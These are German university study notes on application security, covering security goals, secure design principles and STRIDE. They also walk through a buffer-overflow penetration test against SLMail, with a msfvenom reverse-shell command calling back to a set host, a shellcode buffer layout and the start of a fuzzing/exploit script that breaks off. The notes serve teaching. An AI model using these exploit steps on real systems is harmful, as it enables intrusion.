Anwendungssicherheit
Jakob Waibel
2022-02-06

-   1 Introduction
    -   1.1 Contributing
    -   1.2 License
    -   1.3 Was ist sichere Software?
    -   1.4 Was ist IT-Sicherheit?
    -   1.5 Schutzziele/Sicherheitskriterien
    -   1.6 Sicherheitsaspekte
    -   1.7 Warum Sicherheit?
    -   1.8 Sicherheitsbegriffe
    -   1.9 Erforschung von Schwachstellen
    -   1.10 Wo kann man sich über Schwachstellen informieren?
    -   1.11 Wie bestimmt man wie scherwiegend eine Schwachstelle ist?
    -   1.12 Spannungsfeld von IT-Sicherheit
    -   1.13 Fazit
-   2 Aufgabe 2: Thema sicherer Entwurf (3+1 = 4 Punkte)
    -   2.1 Entwurfsprinzipien
        -   2.1.1 Minimierung der Angriffsfläche
        -   2.1.2 Sichere Vorbelegung
        -   2.1.3 Prinzip des kleinsten Privilegs
        -   2.1.4 Prinzip der mehrstufigen Verteidigung
        -   2.1.5 Sicheres Verhalten bei Fehlern bzw. Ausnahmen
        -   2.1.6 Behandle externe Systeme als unsicher
        -   2.1.7 Pflichtentrennung
        -   2.1.8 Verlasse Dich nicht auf Sicherheit durch
            Verschleierung
        -   2.1.9 Einfachheit/KISS
        -   2.1.10 Behebe Sicherheitslöcher richtig
        -   2.1.11 Eingabevalidierung/Ausgabekodierung
        -   2.1.12 Sichere das schwächste Glied
        -   2.1.13 Ökonomie des Mechanismus
        -   2.1.14 Vollständige Vermittlung
        -   2.1.15 Kleinster gemeinsamer Mechanismus
        -   2.1.16 Psychologische Akzeptanz
        -   2.1.17 Zurückhaltung bei Vertrauen
        -   2.1.18 Schutz der Privatssphäre
        -   2.1.19 Offener Entwurf
    -   2.2 Stride Flussdiagramm - Entwurfsprinzipien
    -   2.3 Anwendung des Beispiels auf STRIDE
-   3 Aufgabe 3: Penetration Test: Buffer Overflow (10 Punkte)
    -   3.1 Was ist ein Buffer Overflow?
    -   3.2 Wie findet man einen Buffer Overflow?
    -   3.3 Verwendung von Windows Debuggern
    -   3.4 Verhalten des Stacks bei einem Buffer Overflow
    -   3.5 Vorgehen
        -   3.5.1 Fuzzing/Taking Control of EIP
        -   3.5.2 Bad Characters
        -   3.5.3 Redirect Execution
        -   3.5.4 Schadcode generieren
        -   3.5.5 Resuliterendes SL-Mail Python-Skript
-   4 Aufgabe 4: Thema Sicherheit von Web-Anwendungen (4+4+3+2 = 13
    Punkte)
    -   4.1 Evaluation verschiedener Schutzmechanismen
    -   4.2 Angriffsziele
    -   4.3 OWASP Top 10 Übersicht
    -   4.4 A1: Fehlerhafte Berechtigungsprüfung
    -   4.5 A2: Fehlerhafte Kryptographie
    -   4.6 A3: Injektionen
        -   4.6.1 SQL-Injection
        -   4.6.2 Blind SQL-Injection
        -   4.6.3 SQL-Injection-Demos
        -   4.6.4 DVWA
        -   4.6.5 Gegenmaßnahmen
        -   4.6.6 Command Injection
        -   4.6.7 Cross-Site Scripting (XSS)
        -   4.6.8 Gegenmaßnahmen
        -   4.6.9 Cross-Site-Request-Forgery
    -   4.7 A4: Unsicherer Entwurf
        -   4.7.1 Gegenmaßnahmen
    -   4.8 A5: Fehlerhafte Sicherheitskonfiguration
        -   4.8.1 Gegenmaßnahmen
        -   4.8.2 XML External Entities (XXE)
    -   4.9 A6: Nicht aktuelle Komponenten mit Schwachstellen
    -   4.10 A7: Fehlerhafte Identifizierung und Authentifizierung
        -   4.10.1 Fehlerhaftes Session-Management
    -   4.11 A8: Fehlerhafte Software und Datenintegrität
        -   4.11.1 Gegenmaßnahmen
        -   4.11.2 Unsichere Deserialisierung
    -   4.12 A9: Fehlerhaftes Logging und Monitoring
        -   4.12.1 Gegenmaßnahmen
    -   4.13 A10: Server-Side Request Forgery (SSRF)
        -   4.13.1 Gegenmaßnahmen
        -   4.13.2 File Inclusion
-   5 Aufgabe 5: Sichere Programmierung (secure coding) (10 Punkte)
    -   5.1 Implementierung einer Datenstruktur in Java
    -   5.2 Secure Coding
-   6 Aufgabe 6: Authentisierung/Authentifizierung (3+2 = 5 Punkte)
    -   6.1 Grundlagen
    -   6.2 OAuth2

Introduction

Contributing

These study materials are heavily based on professor Heuzeroth’s
“Anwendungssicherheit” lecture at HdM Stuttgart.

Found an error or have a suggestion? Please open an issue on GitHub
(github.com/jakwai01/application-security):

[QR code to source repository]

If you like the study materials, a GitHub star is always appreciated :)

License

[AGPL-3.0 license badge]

Uni App Security Notes (c) 2022 Jakob Waibel and contributors

SPDX-License-Identifier: AGPL-3.0

Was ist sichere Software?

-   Software die gegen absichtliche Angriffe geschützt ist
-   Software ist selten “automatisch” sicher
-   Software muss jedem möglichen Angriff standhalten können

Was ist IT-Sicherheit?

Sicherheit ist die Eigenschaft eines Systems, die dadurch gekennzeichnet
ist, dass die als bedeutsam angesehen Bedrohungen, die sich gegen die
schützenswerten Güter richten, durch besondere Maßnahmen soweit
ausgeschlossen sind, dass das verbleibende Risiko akzeptiert wird.

Informationssicherheit ist die Sicherheit von IT-Systemen und ihrer
Umgebung gegenüber Bedrohungen von außen, insbesondere gegenüber
Angriffe durch Menschen.

Schutzziele/Sicherheitskriterien

CIA Security Objectives

-   Vertaulichkeit (Confidientiality)
    -   Nur Befugte können auf die Daten zugreifen/die Nachricht lesen
-   Integrität (Integrity)
    -   Manipulation der Daten ist ausgeschlossen. Es muss überprüft
        werden können, dass die Nachricht nicht verändert wurde
-   Verfügbarkeit (Availability)
    -   Die Daten/Dienstleistungen sind immer für Befugte verfügbar,
        wenn sie benötigt werden

Weitere Schutzziele

-   Authentisierung/Authentifizierung (Authentication)
    -   Für den Empfänger einer Nachricht muss es möglich sein, deren
        Herkunft zu ermitteln
    -   Es darf nicht möglich sein, sich als jemand anderes auszugeben
-   Nicht-Abstreitbarkeit/Verbindlichkeit (Non-repudiation)
    -   Der Urheber der Daten oder Absender einer Nachricht soll nicht
        in der Lage sein, seine Urheberschaft zu bestreiten
-   Anonymität (Anonymity)
    -   Schutz der Geheimhaltung der Identität
-   Rechenschaftsfähigkeit (Accountability)
    -   Sicherstellung, dass Subjekte ihren Aktionen zugeordnet werden
        können
-   Revisionsfestigkeit (Auditability)
    -   Sicherstellung, dass vorhergehende Systemzustände wieder
        rekonstruiert werden können
        -   Dies ist nicht im Sinne des Zurücksetzen des Systems
            gemeint, sondern im Sinne des Nachvollziehens, was zuvor
            abgelaufen ist (wer wann welche Aktion durchgeführt hat)
        -   Für Audit-Log muss (SIEM = Security Incident and Event
            Management bzw. Security Information and Event Management)
            gegeben sein:
            -   Vertraulichkeit
            -   Integrität
            -   Verfügbarkeit
            -   Nicht-abstreitbarkeit
            -   Rechenschaftsfähigkeit

Sicherheitsaspekte

[Aspekte]

Warum Sicherheit?

Fehler können in allen Phasen des Entwicklungsprozesses auftreten
(Anforderungen, Architektur, Entwurf, Implementierung, Einsatz)

-   Durchschnittlich 5 sicherheitsrelevante Fehler pro 1000 Zeilen Code
-   Wachsende Konnektivität
-   Steigende Komplexität
-   Angriffe verlagern sich von klassicher IT auf rentablere Ziele
    e.g. Industrieanlagen, mobile Endgeräte, Botnetze oder Geldautomaten

Kosten der Fehlerbehebung kostet nach Produktionsauslieferung zwischen
30x-100x im Vergleich zu dem, was es beim Entwurf gekostet hätte.

Sicherheitsbegriffe

Bedrohung

-   Ein Angreifer mit den Mitteln und Motivation die Anwendung
    anzugreifen

Schwachstelle/Sicherheitslücke

-   Fehler, der zur Verletzung von Sicherheitskriterien (CIA) genutzt
    werden kann

Ein Fehler führt zusammen mit einer Bedrohung zu einer Schwachstelle,
die durch einen Angriff ausgenutzt werden kann

Angriff = Motiv (Ziele) + Methoden + Schwachstelle

Exploit

-   Beschreibung, wie sich eine Schwachstelle für einen Angriff nutzen
    lässt
    -   Nachweis, dass eine Schwachstelle ausgenutzt werden kann
    -   Unterschied zwischen Exploit und Proof-of-Concept
        -   PoC enthält keine schädlichen Funktionen, sondern
            demonstriert lediglich das Vorhandensein einer Schwachstelle

Erforschung von Schwachstellen

-   Prozess des Entdeckes von Schwachstellen und Entwurfsfehlern, die
    ein System (Betriebssystem, Anwendung, etc.) anfällig für Angriffe
    oder Missbrauch machen
-   Klassifikation von Schwachstellen
    -   Schweregrad: niedrig, mittel, hoch
    -   Bereich der Ausnutzung: lokal oder aus der Ferne
-   Zweck: Informationen sammeln über Sicherheitstrends, Bedrohungen und
    Angriffe

Wo kann man sich über Schwachstellen informieren?

-   ExploitDB
-   MITRE CVE (Common Vulnerabilities and Exposures)
-   MITRE CWE (Commond Weakness Enumeration)
-   Google-Projekt Zero
-   OWASP Top 10
-   VulnDB
-   …

Wie bestimmt man wie scherwiegend eine Schwachstelle ist?

-   Bewertung des Schweregrades von Schwachstellen ist wichtig, da es
    wichtig ist schwachstellen zu priorisieren, um diese in der
    richtigen Reihenfolge zu beheben
-   Vordefinierte Schwachstellenbewertungssysteme
    -   CVSS (Common Vulnerability Scoring System)
    -   DREAD

Fragen, die man sich beim erstellen eines Bewertungssystems fragen
sollte

-   Wie einfach ist die Schwachstelle zu lokalisieren?
-   Wie einfach ist sie auszunutzen?
-   Welche Berechtigungen sind erforderlich um sie auszunutzen?
-   Wer kann ausnutzen?
-   Wie schwerwiegend ist das Problem?
-   Kann die Schwachstelle zu einer anderen führen?

Spannungsfeld von IT-Sicherheit

[Spannungsfeld IT-Sicherheit]

IT-Sicherheit bewegt sich im Spannungsfeld von Funktionalität und
Gebrauchstauglichkeit. Mehr Sicherheit bedeutet in der Regel mehr
Einschränkungen und damit weniger Funktionalität und weniger
Gebrauchstauglichkeit

Fazit

-   IT-Systeme sind nur sicher, wenn alle Elemente, die zum IT-System
    gehören, sicher sind
-   Empfohlenes Vorgehen: In alle Bereichen entsprechend des Risikos
    gezielt und moderat investieren, um die wichtigsten Tätigkeiten
    durchzuführen, anstatt das gesamte verfügbare Budget in einem
    Bereich auszugeben

Aufgabe 2: Thema sicherer Entwurf (3+1 = 4 Punkte)

Entwurfsprinzipien

[Entwurfsprinzipien]

Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt
zueinander. In diesem Fall muss man abwägen, welches im konkreten Fall
das wichtigere Prinzip bei der Umsetzung ist. So kann es beispielsweise
sinnvoll sein, “Einfachheit (Ökonomie des Mechanismus)” zu Gunsten von
“Mehrstufige Verteidigung (Trennung von Privilegien)” zu opfern. Ein
anderes Beispiel ist, dass kompliziertere Passwortanforderungen, die
psychologische Akzeptanz behindern.

Minimierung der Angriffsfläche

-   Prinzip
    -   Dem Angreifer so wenig Angriffsfläche bieten, wie möglich
    -   Jedes Feature vergrößert die Angriffsfläche
-   Beispiel
    -   Suchfunktion, die anfällig gegen SQL-Injektion sein könnte. Dies
        könnte durch Datenvalidierung der Suchfunktion, autorisierung
        oder einem Glossar behoben werden
-   Verwandte Prinzipien
    -   “Einfachheit”
    -   “Ökonomie des Mechanismus”
-   Aspekte zur Minimierung der Angriffsfläche
    -   Menge des aktuell ausgeführten Programmcodes reduzieren
    -   Menge der Zugangspunkte und Schnittstellen zur Software
        minimieren
    -   Rechte, mit denen der Programmcode laufen muss anpassen, sodass
        angreifer dadurch keine Vorteile oder Zugriffe auf andere Tools
        erhalten

Sichere Vorbelegung

-   Prinzip
    -   Anwendungen sind so auszuliefern, dass sie möglichst sicher
        vorkonfiguriert sind
    -   Anwender können Sicherheitsmaßnahmen dann nach Bedarf reduzieren
-   Beispiel
    -   Passwortrichtlinie
        -   Sichere Vorbelegung
            -   Auf Stärke Prüfen
            -   Läuft ab
        -   Kann bei bedarf abgestellt werden
    -   Firewall
        -   Standardmäßig sind alle Ports geschlossen
        -   Notwendige Ports werden geöffnet
-   Verwandte Prinzipien
    -   “Prinzip des kleinsten Privilegs”
    -   “Kleinster gemeinsamer Mechanismus”

Prinzip des kleinsten Privilegs

-   Prinzip
    -   Jede Funktion ist nur mit den minimal erforderlichen Rechten
        ausgestattet, unabhängig davon, ob sie intern ausgeführt wird
        oder aufgrund einer Benutzeranforderung
-   Privilegien können sein
    -   Zugriffsberechtigungen
    -   Rechenzeit
    -   Speicherplatz im Hauptspeicher oder auf Festspeichern
    -   Netzwerkbandbreite
-   Beispiel
    -   Normale Benutzer bekommen keine Administratorrechte
    -   Administratoren dürfen keine fachspezifischen Berechtigungen
        haben
-   Verwandte Prinzipien
    -   “Minimierung der Angriffsfläche”
    -   “Pflichtentrennung”

Prinzip der mehrstufigen Verteidigung

-   Prinzip
    -   Es sind mehrere Sicherheitsmaßnahmen hintereinander zu
        verschiedenen Aspekten einzurichten
-   Hinweis
    -   Dieses Prinzip sollte je nach Kritikalität der Daten/Prozesse
        angewendet werden, da es sehr aufwändig ist
-   Verwandte Prinzipien
    -   “Vollständige Vermittlung”
    -   “Pflichtentrennung”
-   Verteidigungsstufen
    -   Authentifizierung
    -   Autorisierung
    -   Verschlüsselung
    -   Audit
-   Beispiel
    -   Ein Fehler in der Administrationsoberfläche erlaubt nicht gleich
        Administratorzugang zur ganzen Anwendung, wenn
        Zugriffsberechtigungen für jeden Zugriff separat geprüft werden
        und außerdem noch alle Zugriffe protokolliert werden

Sicheres Verhalten bei Fehlern bzw. Ausnahmen

-   Prinzip
    -   Vertraulichkeit der Fehlermeldungen
    -   Keine detaillierten Fehlermeldungen für den Anwender sichtbar
    -   Transaktionen schlagen in Anwendungen oft aus verschiedenen
        Gründen fehl
    -   Anwendungen können abstürzen
    -   Wie die Anwendung einene solchen Fehlschlag behandelt,
        entscheidet darüber, ob die Anwendung sicher ist oder nicht.
-   Beispiel
    -   Falls codeWhichMayFail() fehlschlägt, dann ist der Anwender
        automatisch Administrator. Dies ist dann offensichtlich ein
        Sicherheitsrisiko.

            isAdmin = true;
            try {
                codeWhichMayFail();
                isAdmin = isUserInRole("Admin");
            } catch (Exception ex) {
                log.write(ex.toString());
            }
-   Verwandte Anforderungen und Prinzipien
    -   Anforderungskategorie “Ausnahmebehandlung”
    -   “Sichere Vorbelegung”

Behandle externe Systeme als unsicher

-   Prinzip
    -   Daten, die von externen Systemem kommen, sind zunächst einmal
        nicht vertrauenswürdig und müssen erst validiert werden, bevor
        sie verarbeitet oder dem Benutzer angezeigt werden.
-   Beispiel
    -   Eine Online-Banking-Anwendung von Drittanwendung
    -   Internes System muss Daten von externem System auf Sicherheit
        prüfen (e.g. nicht-negativ, in den boundaries)
-   Verwandtes Prinzip
    -   “Zurückhaltung beim Vertrauen”

Pflichtentrennung

-   Prinzip
    -   Mehrere Sicherheitsebenen verwenden, die sich idealerweise
        gegenseitig kontrollieren
    -   Einführung von Rollen, die einer höheren Vertrauensstufe
        angehören als normale Benutzer, hilft bei der Umsetzung
-   Beispiele
    -   Administratoren dürfen das System verwalten e.g. hoch- und
        runterfahren, Passwortrichtlinien einstellen, etc.
    -   Administratoren dürfen sich aber nicht als besonders
        privilegierte Endanwender bei der Anwendung anmelden
    -   Andernfalls könnten sie auch im Namen anderer Benutzer agieren
-   Verwandte Prinzipien
    -   “Prinzip des kleinsten Privilegs”
    -   “Prinzip der mehrstufigen Verteidigung”
    -   “Zurückhaltung beim Vertrauen”

Verlasse Dich nicht auf Sicherheit durch Verschleierung

-   Prinzip
    -   Etwas geheim zu halten oder zu verstecken sollte nicht der
        einzige Sicherheitsmechanismus sein
-   Beispiel
    -   Die Geheimhaltung des Quelltextes einer Anwendung garantiert
        nicht, dass die Anwendung sicher ist
    -   Versteckte URLs, die sich durch Brute-Force-Angriffe evtl. doch
        finden lassen
-   Verwandtes Prinzip
    -   “Offener Entwurf”

Einfachheit/KISS

-   Prinzip
    -   Einfache Programme bieten weniger Angriffsfläche, alleine schon
        deswegen, weil dadurch Programmierfehler weniger wahrscheinlich
        sind
    -   Vermeide daher alles was unnötig komplex oder kompliziert ist
-   Beispiele
    -   Doppelte Negationen
    -   Zu komplexe Architekturen
-   Verwandte Prinzipien
    -   “Minimierung der Angriffsfläche”
    -   “Ökonomie des Mechanismus”

Behebe Sicherheitslöcher richtig

-   Prinzip
    -   Erst einen Testfall für die Sicherheitslücke erstellen und
        implementieren
    -   Fehlerursache verstehen
    -   Fehler beheben und überprüfen durch Tests
-   Anmerkung
    -   Heutzutage oft Designpatterns
    -   Fehler in Entwurfsmuster ist in allen Anwendungen zu beheben,
        die dieses Implemenieren
-   Beispiel
    -   Online-Banking-Kunde kann durch veränderung des Cookies den
        Kontostand anderer Kunden sehen
    -   Der Umgang mit Cookies wird auch in anderen Anwendungen in
        dieser Form eingesetzt, muss also auch verändert werden

Eingabevalidierung/Ausgabekodierung

-   Prinzip
    -   Eingaben auf korrektheit prüfen
    -   Ausgabe kontrollieren
-   Beispiel
    -   Angreifer kann Schadcode in Formularfeld einfügen, welcher dann
        auf einem anderen IT-System ausgeführt wird
    -   SQL-Injection

Sichere das schwächste Glied

-   Prinzip
    -   Sicherheitsmaßnahmen sollen zuerst dort angewendet werden, wo
        sie am meisten erforderlich sind, nicht dort wo sie bequem
        implementiert werden können
-   Beispiel
    -   Wenn eine Schachstelle A aus dem Internet ausgenutzt weden kann
        und eine Schwachstelle B im Intranet ausgenutzt werden kann,
        dann muss zuerst Schwachstelle A abgesichert werden
-   Hinweis
    -   Zuerst Bedrohungen adressieren, die im Rahmen der
        Bedrohungsmodellierung das höchste Risiko ergeben haben

Ökonomie des Mechanismus

-   Prinzip
    -   Den Entwurf so einfach wie möglich halten
-   Verwandtes Prinzip
    -   “Einfachheit”

Vollständige Vermittlung

-   Prinzip
    -   Jeden Objektzugriff durch eine Berechtigungsprüfung absichern
-   Verwandte Prinzipien
    -   “Prinzip der mehrstufigen Verteidigung” (Defense in Depth)

Kleinster gemeinsamer Mechanismus

-   Prinzip
    -   Minimierung der Anzahl der Mechanismen, die von Anwendern
        gemeinsam verwendet werden müssen
    -   Je mehr Mechanismen, desto größer ist die Wahrscheinlichkeit für
        falschen Einsatz und falsche Konfiguration bzw.
        Abstimmungslücken
-   Verwandtes Prinzip
    -   “Minimierung der Angriffsfläche”
    -   “Einfachheit”

Psychologische Akzeptanz

-   Prinzip
    -   Sicherheitsmechanismes dürfen die Verwendung der Software nicht
        gravierend beeinträchtigen
-   Beispiel
    -   Wenn zu viele Sicherheitsabfragen beantwortet werden müssen,
        dann werden diese nicht mehr richtig gelesen und nicht mehr
        ernst genommen
        -   Alle Sicherheitsabfragen werden akzeptiert, d.h. mit
            “weiter” beantwortet ohne den Text zu lesen
        -   Sicherheitsabfragen werden generell abgeschaltet

Zurückhaltung bei Vertrauen

-   Prinzip
    -   Allen Daten, die von außen kommen, ist zu misstrauen
-   Verwandte Prinzipien
    -   “Behandle externe Systeme als unsicher”
    -   “Pflichtentrennung”

Schutz der Privatssphäre

-   Prinzip
    -   Schütze die Daten der Anwender
-   Rechtliche Grundlagen (Datenschutzgrundverordnung,
    Bundesdatenschutzgesetz, Landesdatenschutzgesetz)
-   Grundsätzliche Regel: “Verbot mit Erlaubnisvorbehalt”
    -   Verarbeitung von personenbezogenen Daten grundsätzlich verboten
    -   Ausnahme: Für legitimen Zweck (Vertrag oder Gesetz)

Offener Entwurf

-   Prinzip
    -   Sicherheit sollte nicht ausschließlich auf der Gerheimhaltung
        des Entwurfs beruhen
-   Verwandtes Prinzip
    -   “Verlasse Dich nicht auf Sicherheit durch Verschleierung”

Stride Flussdiagramm - Entwurfsprinzipien

[Datenflussdiagramm]

-   Durch Vertrauensgrenze wird “Seperation of Priviledges” erreicht.
    Außerdem wird damit “Behandle externe Systeme als Unsicher”
    erreicht.
-   Nach AuthN ist die Identität vertrauenswürdig. Ob Allerdings die
    Anfrage an sich legitim ist wissen wir noch nicht.
-   AuthZ prüft, ob die Anfrage valide ist. Hierbei kommt das
    Entwurfsprinzip der “Eingabevalidierung” zur geltung.
-   Durch Authentifizierung und Autorisierug/Berechtigungsprüfung haben
    wir eine “Mehrstufige Verteidigung” implementiert.

Anwendung des Beispiels auf STRIDE

-   Spoofing Identity kann mit AuthN verhindert werden
-   Tampering Information ist auf physisches Beispiel schwer anwendbar.
    Es könnte jemand anderes unterschrieben haben, wodurch man eventuell
    Informationen über einen anderen Account erhält. Digital wäre das
    mit einer SQL-Injection vergleichbar
-   Repudiation wird in diesem Beispiel nicht verhindert. Wir bräuchten
    Logging ins Audit-Log (Man kommt jeden Tag in die Filiale und
    versucht mit gefälschtem Ausweis AuthN zu umgehen). Wir können nicht
    sagen, dass diese Person schon versucht hat das System zu umgehen.
    Auch bei AuthZ wird nicht geprüft wie viele invalide
    withdrawal-Anfragen schon gestellt wurden. Auch hier bräuchten wir
    wieder Logging ins Audit-Log. In beiden Fällen ist die Kante ins
    Audit-Log Rot-Grün (Orange), da ein Teil des Logs vertrauenswürdig
    ist (AuthN, AuthZ), und Teile nicht (Withdrawal Request,
    Identification Data)
-   Information Disclosure wird hier gut gehandhabt. Kunde bekommt keine
    Informationen, außer ob er Geld bekommt oder nicht
-   Denial of Service kann Online durch IP-Sperren oder
    Banbreitenbegrenzung verhindert werden. Analog halten sehr alte
    Leute oft den Verkehr auf. In diesem Fall könnte man gegen diese
    “Attacke” vorgehen, indem man ein Wartezimmer einfügt
-   Elevation of Priviledges wird hier weitesgehend verhindert. Man
    hätte nur die Privilegien, wenn man es schafft sich als jemand
    anderes auszugeben. AuthN und AuthZ sind die Gegenmaßnahmen, die
    unser System dagegen bietet

Aufgabe 3: Penetration Test: Buffer Overflow (10 Punkte)

Was ist ein Buffer Overflow?

Ein Buffer Overflow tritt auf, wenn die Länge von Eingaben nicht
überprüft wird.

Bei einem Buffer Overflow überschreitet ein Eingabewert den für ihn im
Speicher vorgesehenen Platz und überschreibt dadurch andere wichtige
Speicherbereiche. Überschrieben wird typischerweise der Speicherbereich,
in dem sich die Rücksprungadresse aus einer aufgerufenen Funktion
befindet, da man dadurch als Angreifer den Programmablauf kontrollieren
kann.

In folgendem Code kann ein Buffer Overflow auftreten, da die Länge des
Inputs nicht geprüft wird:

    #include <stdio.h>
    #include <string.h>

    int main (int argc, char** argv)
    {
        char buffer[500];
        strcpy(buffer, argv[1]);

        return 0
    }

Wie findet man einen Buffer Overflow?

-   Begutachtung des Quelltextes, falls dieser zugänglich ist
-   Reverse Engineering
    -   OllyDbg
    -   ImmunityDebugger
    -   gdb
    -   edb
-   Fuzzing
    -   Zufällige Eingabe an die Anwendunge schicken, bis diese Abstürzt

Verwendung von Windows Debuggern

-   OllyDbg, ImmunityDebugger
-   Zu untersuchendes Programm laden mit Hilfe von File -> Attach
-   F2: Breakpoint setzen
-   F7: In Funktion springen
-   F8: Funktion ausführen ohne hineinzuspringen
-   Inhalt des Speichers ab einer Adresse anzeigen, die in einem
    Register steht:
    -   Rechtsklick auf eine Speicheradresse in einem Register, dann
        “Follow in Dump”
-   Befehl oder Befehlssequenz suchen:
    -   Rechtsklick “Search For” -> “Command” bzw. “Sequence of
        Commands”
-   mona.py: ImmunityDebugger-Erweiterung
    -   !mona zeigt die Informationsseite an
    -   Mit Toolbar-Icon “l” oder Alt+L kann man auf die Log-Ansicht
        umschalten
    -   Hilfe zu einem Befehl !mona help <Befehl>

Verhalten des Stacks bei einem Buffer Overflow

[Stack]

Vorgehen

Fuzzing/Taking Control of EIP

-   Eingaben an die Anwendung schicken, die von der Anwendung so nicht
    vogesehen waren und auf den Absturz der Anwendung warten

-   Ein Absturz deutet auf eine fehlende oder schlechte
    Eingabevalidierung hin

-   Schickt man einfach nur eine Wiederholung eines Buchstabens,
    e.g. “AAAA…”, dann weiß man im nachhinein nicht, welcher Teil der
    Eingabe wo gelandet ist

-   Binäre Suche

    -   Erste Hälfte A, zweite B
    -   Stehen im EIP A’s, dann den linken Teilbereich wieder in zwei
        Teile teilen und so weiter bis man den EIP korrekt lokalisiert
        hat
    -   Dauert vergleichsweise lang

-   Unique String

    -   Schicken einer eindeutigen Zeichenkette, die ein Auffinden
        zulassen
    -   Generiert werden kann eine solche Zeichenkette z.B. mit einem in
        Metasploit mitgelieferten Ruby-Skript:

        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

    -   Muster wiederfinden

        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <query> -l <length>

Bad Characters

-   Manche Zeichen haben besondere Effekte in der Zielanwendung
    e.g. \x00Null Byte - Wird als String-Ende interpretiert,
    \x0DCarriage Return - Beendet Eingabe für POP-Server
-   Am besten alle Hex-Zeichen von 00 bis FF ausprobieren und
    problematische weglasse, wenn man Shellcode kodiert

Redirect Execution

-   Die Adresse des ESP kann sich bei jeder Ausführung des Programms
    ändern
-   Weitere Module (e.g. DLLs), welche kein ASLR (Address Space Layout
    Randomization) verwenden, nach JMP ESP oder PUSH ESP/RETN
    Anweisungen durchsuchen
-   Mit Hilfe der nasm_shell können Befehle in Modulen lokalisiert
    werden

    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    nasm > jmp esp
    00000000 FFE4

-   Mit Hilfe von !mona modules können sich Informationen über die
    Module finden lassen. Dort kann man dann auch sehen ob ASLR oder DEP
    (Data Execution Prevention) aktiviert ist, um geeignete Module
    festzustellen
-   Außerdem darf die Speicheradresse des Sprungbefehls JMP ESP keine
    problematischen Zeichen e.g. \x00, \x0A oder \x0D enthalten
-   Dieses Module dann im im ImmunityDebugger öffnen
    -   Toolbar Icon “e” für executable Modules anklicken
    -   Dopelklick auf den Namen des Modules
    -   Suche nach Befehlen oder Befehlssequenzuen durchführen
        -   Rechtsklick “Search For” -> “Command” oder “Sequence of
            Commands”
    -   Falls diese Suche nicht erfolgreich ist, Suche im gesamten
        Speicherbereich (auch Datensegmenten) der Anwendung durchführen
        -   Dies ist zielführend, falls DEP nicht aktiviert ist.
            -   Durch Toolbar Icon “m” werden alle Segmente (Module) mit
                ihren Flags angezeigt, so dass dies nochmals überprüft
                werden kann.
        -   DEP = Data Execution Prevention: Verhindert Ausführung von
            Code aus Datenbereichen durch Hard- und Software-Prüfungen.
    -   Toolbar Icon “c” anklicken, dann:

        !mona find -s "\xff\xe4" -m <Modulname>

Schadcode generieren

msfvenom [Optionen] <var=val> (/usr/share/metasploit-framework)

    -p <payload> Zu erzeugender Schadcode (payload) Beispiel: `-p windows/shell_reverse_tcp`
    -f <format> Ausgabeformat, e.g. c für Ausgabe in Sprache C. --help-formats zeigt verfügbare Formate an
    -a <architecture> Zielarchitektur des Schadcodes, z.B. `x86` für 32bit
    --platform <platform> Zielplatform des Schadcodes, z.B. `windows`
    -b <list> Liste im erzeugten Code zu vermeidender problematischer Zeichen (bad characters).
    -e <encoder> Kodierung des Shellcodes, z.B. `x86/shikata_ga_nai`
    -l <module_type> Modultyp auflisten. `module_type` kann sein: `payloads`, `encoders`, `nops`, `all`

-   Parameter für Schadcode (payload): LHOST, LPORT etc.
-   Beispiel:
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
-   EXITFUNC=thread verhindert Absturz des Zielprozesses bei Beenden der
    Reverse Shell

Problem: Der erzeugte Schadcode enthält zu Beginn den Dekodierer, um den
eigentlichen Schadcode aus den Bytes zurückzugewinnen

-   Der Dekodierer benötigt zum Dekodieren aber Speicherplatz am Anfang
    des Stack-Bereichs
-   Wird dieser nicht geschaffen, überschreibt der Dekodierer den zu
    dekodierenden Shell-Schadcode

Abhilfe

-   Platz für den Dekodierer durch “No Operation” Opcodes (NOOPS) mit
    der Hexkodierung \x90 schaffen

    buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" *(3500-2606-4-351-16)

Sonderfall Manchmal passt der Schadcode vom Umfang her nicht mehr in den
verfügbaren Speicherplatz ab der Adresse auf die ESP zeigt.

Lösung

-   Anderes Register suchen, welches auf eine Adresse zeigt, welche
    möglichst nah am Beginn des durch einen Angriff eingefügten Puffers
    liegt, e.g. EAX
-   Registerwert anpassen und dann dorthin springen
    -   ADD <Register>, <Anpassungswert>
        -   e.g. ADD EAX, 12
    -   JMP EAX
-   Die zugehörigen Opcodes dann in den Speicherbereich schreiben auf
    den ESP zeigt, so dass ein bereits im Programm vorhandener JMP ESP
    Befehl, dessen Adresse in EIP geschrieben wird, diese Opcodes (1.
    Stufe des Shellcodes) ausführt, welche dann den eigentlichen
    Shellcode (2. Stufe des Shellcodes) ausführen, der an EAX+12 liegt.

Resuliterendes SL-Mail Python-Skript

    #!/usr/bin/python

    def connect_to_SLMail(ip, buffer):
        """Connecting to SLMail server using provided buffer for password field"""
        import socket
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,110))      # connect to IP, POP3 port
            data=s.recv(1024)                   # receive banner
            print(data)

            s.send('USER root\r\n')             # send username "test"
            data=s.recv(1024)                   # receive reply
            print(data)

            s.send('PASS ' + buffer + '\n\n')   # send password
            data=s.recv(1024)                   # receive reply
            print(data)
            s.send('QUIT\r\n')                  # send "QUIT"
            s.close()
        except:
            print "Could not connect to POP3 port\n"

    def fuzz(ip):
        """Fuzzing password field of SLMail server to detect crash"""
        buffer=["A"]
        counter=100
        while len(buffer) <= 30:
            buffer.append("A"*counter)
            counter=counter+200
        for string in buffer:
            print("Fuzzing PASS of {0} with {1} bytes".format(ip, len(string)))
            connect_to_SLMail(ip, string)

    def replicate_crash(ip):
        """Replicating the crash using a string of A\'s with the neccessary length"""
        buffer = "A"*2700
        connect_to_SLMail(ip, buffer)

    def attack_with_unique_string(ip):
        """Connecting to SLMail server with a unique string created by metasploit's pattern_create.rb script"""
    #    Using a unique string to determine where each part of the input is placed on victim machine.
    #    Unique string has been created with:
    #      /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>
    #
    #   Offset of string in EIP register can then be determined with:
    #      /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <PATTERN>
    #
